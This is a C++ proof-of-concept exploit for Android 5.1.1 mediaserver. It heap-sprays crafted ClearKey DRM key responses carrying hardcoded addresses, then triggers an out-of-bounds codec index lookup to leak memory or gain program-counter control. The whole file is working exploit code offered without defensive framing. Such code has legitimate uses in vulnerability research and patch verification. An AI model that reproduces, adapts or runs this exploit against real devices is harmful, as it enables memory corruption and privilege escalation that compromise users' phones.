#define LOG_TAG "mediapoc"
#define private public
//#define LOG_NDEBUG 0
//Tested on Android 5.1.1 LMY48I hammerhead
#include <fcntl.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <binder/IPCThreadState.h>
#include <binder/ProcessState.h>
#include <binder/IServiceManager.h>
#include <cutils/properties.h>
#include <utils/Log.h>
#include <binder/Parcel.h>    
#include <cstring>
#include <cstdio>
#include <binder/ProcessState.h>    
#include <binder/IPCThreadState.h>

#include <binder/IServiceManager.h>    
#include <media/IMediaPlayerService.h>
#include <media/IMediaCodecList.h>
#include <media/MediaCodecInfo.h>
#include <media/IAudioFlinger.h>
#include <media/ICrypto.h>
#include <media/IDrm.h>

const int BUF_SIZE = 1000 * 1024;
const int STATIC_ADDR = 0x80808080;
const int GADGET_OFFSET = 0xb0000;

using namespace android;

char key_buf[100];
size_t bkeylen;
char *bkeystr;

char raw_buf[GADGET_OFFSET + 0x3000];
char *payload;
size_t payload_len;

char buf[BUF_SIZE * 2];

char* TEMPLATE =             "{"
                "\"keys\":"
                    "[{"
                        "\"kty\":\"oct\""
                        "\"alg\":\"A128KW1\""
                        "\"kid\":\"%s\""//clearkeykeyid010
                        "\"k\":\"%s\"" //Hello Frield
                    "}]"
            "}";

static const uint8_t kClearKeyUUID[16] = {
        0x10,0x77,0xEF,0xEC,0xC0,0xB2,0x4D,0x02,
        0xAC,0xE3,0x3C,0x1E,0x52,0xE2,0xFB,0x4B
    };


char *base64_encode(const unsigned char *data,
                    size_t input_length,
                    size_t *output_length) {

    static int mod_table[] = {0, 2, 1};
    static char encoding_table[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
                                'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
                                'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
                                'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
                                'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
                                'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                                'w', 'x', 'y', 'z', '0', '1', '2', '3',
                                '4', '5', '6', '7', '8', '9', '+', '/'};

    *output_length = 4 * ((input_length + 2) / 3);

    char *encoded_data = (char*)malloc(*output_length);
    if (encoded_data == NULL) return NULL;

    for (int i = 0, j = 0; i < input_length;) {

        uint32_t octet_a = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_b = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_c = i < input_length ? (unsigned char)data[i++] : 0;

        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;

        encoded_data[j++] = encoding_table[(triple >> 3 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 2 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 1 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 0 * 6) & 0x3F];
    }

    //for (int i = 0; i < mod_table[input_length % 3]; i++)
    //    encoded_data[*output_length - 1 - i] = '=';

    return encoded_data;
}

const size_t SIZE = 4096 - 0x10;
//const size_t SIZE = 160;

void setupRawBufForInfoleak(char* buf)
{
    for(size_t i=0; i< SIZE/ sizeof(int); i++)
    {
        *((unsigned int*)buf + i) = 0xb3003010;
    }
    //+0 None
    *((unsigned int*)buf + 1) = 0xb3004010;//+4 mrefs we need an accesible addr
    *((unsigned int*)buf + 2) = 0xb6ce3000;//+8 AString addr, use base libmedia.so
    *((unsigned int*)buf + 3) = 0x400;//+8+4 AString size

    *(unsigned int*)(buf + 20) = 0;
    *(unsigned int*)(buf + 32) = 0;
    *(unsigned int*)(buf + 52) = 0;
}

void setupRawBufForPControl(char* buf)
{
    const unsigned int BASEADDR = 0xb3003010;
    for(size_t i=0; i< SIZE/ sizeof(int); i++)
    {
        *((unsigned int*)buf + i) = 0x41414141;
    }
    //+0 None
    *((unsigned int*)buf + 1) = BASEADDR + 12;//+4 mrefs we need an accesible addr
    *((unsigned int*)buf + 3) = 0x10000000;//INIT_STRONG_VALUE at +12
    //*((unsigned int*)buf + 4) = BASEADDR + 0x;//
    *((unsigned int*)buf + 5) = BASEADDR + 0x20;//
    *((unsigned int*)buf + 8) = BASEADDR + 0x20 + 4;//
    *((unsigned int*)buf + 11) = 0x61616161;//
}

void setupRawBufForZone160(char* buf)
{
    for(size_t i=0; i< 160/ sizeof(int); i++)
    {
        *((unsigned int*)buf + i) = 0xb3003010;
    }
}
int main(int argc, char** argv) {

    printf("the size of mediacodecinfo is %d\n", sizeof(MediaCodecInfo));

    char rawbuf[SIZE];
    memset(rawbuf,'A',sizeof(rawbuf));
    //setupRawBufForInfoleak(rawbuf); //infoleak use this
    setupRawBufForPControl(rawbuf);
    rawbuf[SIZE-1] = 0;

    sp<ICrypto> crypto = interface_cast<IMediaPlayerService>(defaultServiceManager()->getService(String16("media.player")))->makeCrypto();
    sp<IDrm> drm = interface_cast<IMediaPlayerService>(defaultServiceManager()->getService(String16("media.player")))->makeDrm();

    Vector<uint8_t> sess;
    unsigned int st = drm->createPlugin(kClearKeyUUID);
    printf("[+] drm create status %d\n", st);
    st = drm->openSession(sess);
    printf("[+] opensess status %d\n", st);
    printf("[+] sess size %d\n", sess.size());
    
    payload = base64_encode((unsigned char*)rawbuf, SIZE-1, &payload_len);
    char buf[0x1000*0x20];
    printf("[+]spraying pagesize");
    for (int i = 0; i < 0x1200; i++)
    {
        memset(key_buf, 0, sizeof(key_buf));
        sprintf(key_buf, "%d", i);
        
        bkeystr = base64_encode((unsigned char *)key_buf, strlen(key_buf), &bkeylen);
	
        memset(buf, 0, sizeof(buf));
        sprintf(buf, TEMPLATE, bkeystr, payload);
        
        Vector<uint8_t> keyset;
        Vector<uint8_t> resp;
        resp.appendArray(reinterpret_cast<const uint8_t*>(buf), strlen(buf));

        st = drm->provideKeyResponse(sess, resp , keyset);
        if (i % 0x100 == 0) 
            printf("[+] sprayed 0x%x status %d resp %s\n", i, st, keyset.array());
//        break;
    }
    getchar();
    
    printf("[+]spraying zone160");
    //now spray SIZE 160
    const size_t ZONESIZE = 160;
    memset(rawbuf,'a',sizeof(rawbuf));
    setupRawBufForZone160(rawbuf);
    rawbuf[ZONESIZE-1] = 0;
    payload = base64_encode((unsigned char*)rawbuf, ZONESIZE-1, &payload_len);
    for (int i = 0; i < 0x600; i++)
    {
        memset(key_buf, 0, sizeof(key_buf));
        sprintf(key_buf, "%d", i);
        
        bkeystr = base64_encode((unsigned char *)key_buf, strlen(key_buf), &bkeylen);
    
        memset(buf, 0, sizeof(buf));
        sprintf(buf, TEMPLATE, bkeystr, payload);
        
        Vector<uint8_t> keyset;
        Vector<uint8_t> resp;
        resp.appendArray(reinterpret_cast<const uint8_t*>(buf), strlen(buf));

        st = drm->provideKeyResponse(sess, resp , keyset);
        if (i % 0x100 == 0) 
            printf("[+] sprayed 0x%x status %d resp %s\n", i, st, keyset.array());
//        break;
    }
    puts("now input index to trigger");
    unsigned int index;
    scanf("%d", &index);

    sp<IMediaPlayerService> service = interface_cast<IMediaPlayerService>
        (defaultServiceManager()->getService(String16("media.player")));
    sp<IMediaCodecList> list = service->getCodecList();
    size_t cnt = list->countCodecs();
    sp<MediaCodecInfo> ci = list->getCodecInfo(index);
    const AString& name = ci->mName;
    printf("length %d\n", name.size());
    for(size_t i=0;i<name.size();i++)
    {
        printf("%x", name.c_str()[i]);
        if( (i+1) % 4 == 0)
        {
            printf(" ");
        }
    }
    puts("");
    printf("name is %s\n", ci->getCodecName());
    return 0;
}
